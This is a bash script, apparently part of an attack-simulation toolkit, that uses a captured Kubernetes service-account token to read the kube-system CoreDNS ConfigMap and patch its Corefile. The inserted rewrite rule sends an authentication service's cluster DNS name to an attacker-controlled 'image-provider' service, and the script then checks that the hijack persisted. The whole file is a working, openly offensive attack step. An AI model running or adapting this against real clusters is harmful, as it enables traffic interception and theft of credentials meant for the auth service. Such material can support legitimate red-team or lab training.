#!/usr/bin/env bash
set -eu

if [ -f ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh ]; then
  # Prefer the shared helper when the script runs inside the attacker image.
  source ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh
else
  # Remote stdin execution may not have the helper file available.
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

# --- Config ---
REWRITE_LINE="rewrite name auth.$AUTH_NS.svc.cluster.local image-provider.$ATTACKED_NS.svc.cluster.local"
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN_PATH="$DATA_PATH/KC1/token"
NS="kube-system"
CM_NAME="coredns"
TOKEN=$(cat ${TOKEN_PATH})
TMP_FILE="$DATA_PATH/KC1/Corefile"

# Installing dependencies and setup
require_tools curl jq awk grep
mkdir -p "$(dirname "$TMP_FILE")"

# --- HTTP helpers ---
api_get() {
  path="$1"
  curl -k --fail --silent --show-error \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json" \
    "$APISERVER$path"
}

api_patch_json() {
  path="$1"
  curl -k --fail --silent --show-error \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/merge-patch+json" \
    -X PATCH \
    --data-binary @- \
    "$APISERVER$path"
}

api_patch_strategic() {
  path="$1"
  curl -k --fail --silent --show-error \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/strategic-merge-patch+json" \
    -X PATCH \
    --data-binary @- \
    "$APISERVER$path"
}

# --- 1) Read ConfigMap coredns ---
set +e
CM_JSON="$(api_get "/api/v1/namespaces/${NS}/configmaps/${CM_NAME}" 2>&1)"
rc="$?"
set -e

if [ "$rc" -ne 0 ]; then
  echo "$CM_JSON" | grep -qi "NotFound" && { echo "Error: ConfigMap ${CM_NAME} not found in ${NS}." >&2; exit 1; }
  echo "$CM_JSON" | grep -qi "Forbidden" && { echo "403 Forbidden: ServiceAccount has no grants on configmaps/${CM_NAME} in ${NS}." >&2; exit 1; }
  echo "$CM_JSON" >&2
  exit 1
fi

CORE_ORIG="$(printf '%s' "$CM_JSON" | jq -r '.data.Corefile')"
if [ -z "$CORE_ORIG" ] || [ "$CORE_ORIG" = "null" ]; then
  echo "Error: .data.Corefile does not exist in ConfigMap ${CM_NAME} in ${NS}" >&2
  exit 1
fi

# --- 2) Prepare new Corefile ---
printf '%s\n' "$CORE_ORIG" > $TMP_FILE

# Check whether the rewrite is already present in the correct location
if awk -v ins="$REWRITE_LINE" '
  BEGIN{depth=0; found=0}
  {
    line=$0
    t=line; sub(/^[[:space:]]*/,"",t)
    if (depth==1 && t==ins) { found=1; exit }
    oc=gsub(/{/,"{"); cc=gsub(/}/,"}"); depth+=oc-cc
  }
  END{ exit found?0:1 }
' $TMP_FILE; then
  echo "[=] Rewrite already present in the correct place. No modifications."
  NEED_PATCH=0
else
  # If a top-level "health" block exists, insert the rewrite line immediately after it
  if grep -qE '^[[:space:]]*health([[:space:]]|$)' $TMP_FILE; then
    awk -v ins="$REWRITE_LINE" '
      BEGIN{depth=0; in_health=0; inserted=0}
      {
        line=$0

        # Remove the line if it is already present in the wrong location
        t=line; sub(/^[[:space:]]*/,"",t)
        if (t==ins && depth!=1) next

        print line

        # Mark the health block
        if (depth==1 && line ~ /^[[:space:]]*health([[:space:]]|$)/) in_health=1

        oc=gsub(/{/,"{"); cc=gsub(/}/,"}"); depth+=oc-cc

        # Exit the health block: when back to depth==1, insert the rewrite immediately after the block
        if (in_health && depth==1 && !inserted) {
          printf "    %s\n", ins
          inserted=1
          in_health=0
        }
      }
    ' $TMP_FILE > $TMP_FILE.new
  else
    # Otherwise put rewrite line after the opening of the server block ".:53 {"
    awk -v ins="$REWRITE_LINE" '
      BEGIN{inserted=0}
      {
        line=$0
        # Remove every duplicate of the line
        t=line; sub(/^[[:space:]]*/,"",t)
        if (t==ins) next

        print line
        if (!inserted && line ~ /^[[:space:]]*\.\:53[[:space:]]*\{[[:space:]]*$/) {
          printf "    %s\n", ins
          inserted=1
        }
      }
    ' $TMP_FILE > $TMP_FILE.new
  fi
  NEED_PATCH=1
fi

# --- 3) Apply patch to ConfigMap (only if needed) ---
if [ "${NEED_PATCH}" -eq 1 ]; then
  echo "[+] Patching ConfigMap ${CM_NAME} in ${NS}..."
  CORE_NEW="$(cat $TMP_FILE.new)"
  jq -n --arg core "$CORE_NEW" '{data:{Corefile:$core}}' \
    | api_patch_json "/api/v1/namespaces/${NS}/configmaps/${CM_NAME}" >/dev/null
  echo "[+] Patch done."
else
  echo "[=] No patch applied."
fi

VERIFY_JSON="$(api_get "/api/v1/namespaces/${NS}/configmaps/${CM_NAME}")"
if ! printf '%s' "$VERIFY_JSON" | jq -e --arg rewrite "$REWRITE_LINE" '.data.Corefile | strings | contains($rewrite)' >/dev/null; then
  echo "Error: DNS rewrite was not persisted in ConfigMap ${NS}/${CM_NAME}." >&2
  exit 1
fi

rm -f "$TMP_FILE" "$TMP_FILE.new"
echo "[OK] Done."
